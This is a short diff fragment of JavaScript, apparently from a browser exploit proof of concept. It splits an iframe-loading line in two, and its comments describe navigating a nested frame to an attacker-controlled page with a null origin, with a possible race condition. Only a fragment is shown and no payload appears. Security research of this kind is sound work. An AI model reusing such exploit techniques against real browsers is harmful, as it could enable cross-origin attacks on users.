@@ -22,7 +22,8 @@ x.onMessage.addListener(console.log);
 let f=document.createElement('iframe');
 f.width=1000;
 f.height=1000;
-f.src='https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf'; document.body.appendChild(f);
+f.src='https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf';
+document.body.appendChild(f);
 
 // Navigate nested, nested frame to attacker controlled page with null origin.
 // I think this also creates a race condition version
